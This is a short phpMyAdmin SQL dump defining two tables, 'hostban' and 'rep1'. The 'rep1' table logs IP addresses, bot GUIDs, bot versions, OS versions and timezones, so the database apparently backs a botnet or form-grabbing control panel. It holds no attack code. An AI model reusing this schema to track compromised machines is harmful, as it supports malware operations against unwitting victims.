-- phpMyAdmin SQL Dump
-- version 3.2.2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jan 04, 2010 at 02:05 AM
-- Server version: 5.0.51
-- PHP Version: 5.2.6-1+lenny3

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- Database: `formg4`
--

-- --------------------------------------------------------

--
-- Table structure for table `hostban`
--

CREATE TABLE IF NOT EXISTS `hostban` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `host` varchar(1000) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

-- --------------------------------------------------------

--
-- Table structure for table `rep1`
--

CREATE TABLE IF NOT EXISTS `rep1` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `ip` varchar(20) NOT NULL,
  `bot_guid` varchar(40) NOT NULL,
  `bot_version` int(10) unsigned NOT NULL,
  `local_time` datetime NOT NULL,
  `timezone` varchar(80) character set ucs2 collate ucs2_bin NOT NULL,
  `tick_time` datetime default NULL,
  `os_version` varchar(20) NOT NULL,
  `language_id` int(10) unsigned NOT NULL,
  `date_rep` datetime NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `ip` (`ip`,`bot_guid`,`bot_version`,`timezone`,`os_version`,`language_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=51 ;
